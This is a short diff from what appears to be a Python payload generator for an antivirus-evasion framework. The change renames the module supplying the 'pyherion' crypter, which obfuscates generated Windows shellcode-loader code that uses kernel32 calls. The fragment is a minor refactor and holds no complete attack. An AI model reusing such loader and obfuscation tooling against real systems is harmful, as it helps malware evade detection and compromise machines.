@@ -128,7 +128,7 @@ class Payload:
                 PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
 
                 if self.required_options["use_pyherion"][0].lower() == "y":
-                    PayloadCode = crypters.pyherion(PayloadCode)
+                    PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
 
@@ -166,7 +166,7 @@ class Payload:
                 PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
 
                 if self.required_options["use_pyherion"][0].lower() == "y":
-                    PayloadCode = crypters.pyherion(PayloadCode)
+                    PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
 
